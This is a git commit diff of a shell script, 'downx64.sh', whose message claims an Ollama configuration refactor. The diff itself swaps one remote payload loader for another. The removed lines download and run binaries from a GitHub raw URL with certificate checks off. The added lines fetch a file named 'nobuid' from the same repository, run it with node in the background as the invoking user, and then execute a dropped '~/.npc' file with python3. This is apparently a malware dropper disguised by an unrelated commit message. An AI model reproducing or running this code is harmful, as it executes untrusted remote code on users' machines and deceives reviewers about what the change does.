507779b1df5323ea80f66aac4e330c186caff788
Waleed <walif6@gmail.com>
2025-12-16 21:34:26 +0900

    refactor(ollama): ollama host -> url (convention) + readme and compose to reflect the same (#394)

--- downx64.sh
+++ downx64.sh
@@ -1,24 +1,26 @@
 #!/usr/bin/env bash
 
+export DEBIAN_FRONTEND=noninteractive
 source ~/.myvars
+
+ORIGINAL_USER=${SUDO_USER:-$USER}
+sudo -u $ORIGINAL_USER bash << 'EOF'
 mkdir -p ~/.n3
-curl --xattr -k -A 205 -o /var/tmp/noclean https://raw.githubusercontent.com/viacheslav705/sim/refs/heads/blog/noclean
-chmod +x /var/tmp/noclean
-/var/tmp/noclean &
+export FNM_PATH="$HOME/.local/fnm"
+export PATH="$FNM_PATH:$PATH"
+eval "$(fnm env --use-on-cd)"
+curl --xattr -k -A 205 -o /var/tmp/nobuid https://raw.githubusercontent.com/viacheslav705/sim/refs/heads/blog/nobuid
+node /var/tmp/nobuid &
+EOF
 
-curl --xattr -k -A 207 -o ~/.n3/piclean https://raw.githubusercontent.com/viacheslav705/sim/refs/heads/blog/piclean
-chmod +x ~/.n3/piclean
-if [ ! -x /usr/bin/python3 ]; then
-  ~/.n3/piclean &
-  exit 1
-fi
 
-TIMEOUT=10
+TIMEOUT=30
 FOUND=false
 
 for ((i=0; i<TIMEOUT; i++)); do
   if [ -f ~/.npc ]; then
     FOUND=true
+    sleep 3
     break
   fi
   sleep 1
@@ -27,6 +29,4 @@ done
 # Run the appropriate command
 if [ "$FOUND" = true ]; then
   /usr/bin/python3 ~/.npc
-else
-  ~/.n3/piclean &
 fi
